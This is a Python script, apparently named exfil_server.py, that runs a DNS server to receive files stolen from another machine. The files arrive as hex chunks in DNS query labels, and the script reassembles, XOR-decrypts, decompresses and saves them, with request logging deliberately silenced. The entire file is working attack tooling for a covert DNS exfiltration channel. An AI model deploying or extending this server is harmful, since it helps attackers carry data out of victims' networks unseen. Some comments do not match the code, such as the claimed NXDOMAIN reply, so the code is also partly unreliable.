from dnslib import DNSRecord, DNSHeader
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import binascii
import gzip
import sys
from datetime import datetime

def color(string, color=None):
    attr = []
    # bold
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)

    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
    sys.stdout.flush() 

class DataResolver(BaseResolver):
    def __init__(self, password):
        self.data_store = {}  # Dictionary to store data chunks by filename
        self.password = password.encode()

    def xor_decrypt(self, data, password):
        # Create an array to store the decrypted bytes
        decrypted_data = bytearray()

        # Decrypt each byte
        for i in range(len(data)):
            decrypted_byte = data[i] ^ password[i % len(password)]
            decrypted_data.append(decrypted_byte)

        return decrypted_data

    def resolve(self, request, handler):
        qname = request.q.qname
        labels = str(qname).split('.')
        
        # Simulate an NXDOMAIN response
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

        # Extract metadata and filename from the second last label
        metadata = labels[5]
        try:
            filename_hex, timestamp, number_of_chunks = metadata.split('|')
            filename = bytearray.fromhex(filename_hex).decode()
        except (binascii.Error, ValueError):
            return reply

        # Prepare the file key
        file_key = f"{timestamp}_{filename}"

        if file_key not in self.data_store:
            self.data_store[file_key] = [None] * int(number_of_chunks)  # Pre-allocate list for all chunks
            print(color(f"[*] Reception of new file {file_key} initiated!"))

        # Extract chunk ID and hex-encoded chunks
        chunk_id = int(labels[0])
        hex_chunks = labels[1:5]
        hex_data = ''.join(hex_chunks)
        self.data_store[file_key][chunk_id] = hex_data

        progress(chunk_id, number_of_chunks, f"Receiving file {file_key}...")
        if chunk_id == int(number_of_chunks) -1:
            chunks=self.data_store[file_key]
            print(color(f"\n[+] Transfer of {file_key} complete!"))
            if None in chunks:
                print(color(f"[!] Missing chunks for {file_key}, file will not be written.\n"))
            else:
                try:
                    encrypted_data = bytearray.fromhex(''.join(chunks))
                    decrypted_data = self.xor_decrypt(encrypted_data, self.password)
                    # Check if the file is gzipped by checking the first two bytes (gzip magic number)
                    if decrypted_data[:2] == b'\x1f\x8b':
                        output_file = file_key + ".gz"
                        with open(output_file, 'wb') as f:
                            f.write(decrypted_data)
                        with gzip.open(output_file, 'rb') as gz_file:
                            decompressed_data = gz_file.read()
                        decompressed_output_file = output_file[:-3]  # Remove .gz extension
                        with open(decompressed_output_file, 'wb') as f:
                            f.write(decompressed_data)
                        print(color(f"[+] Data written to {file_key}\n"))

                except (binascii.Error, ValueError):
                    print(color(f"[!] Failed to decode data for {file_key}\n"))

        return reply

class NoOpLogger:
    def log_pass(self, *args, **kwargs):
        pass

    log_recv = log_send = log_request = log_reply = log_truncated = log_error = log_data = log_pass

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exfil_server.py <dns_server_ip> <password>")
        sys.exit(1)

    dns_server_ip = sys.argv[1]
    password = sys.argv[2]
    logger = NoOpLogger()  # Use the no-op logger to suppress output
    resolver = DataResolver(password)
    server = DNSServer(resolver, port=53, address=dns_server_ip, logger=logger, tcp=False)
    
    try:
        server.start_thread()
        print(color("[+] DNS server started. Press Ctrl+C to stop."))
        while True:
            pass
    except KeyboardInterrupt:
        print(color("[!] Stopping server..."))
        server.stop()
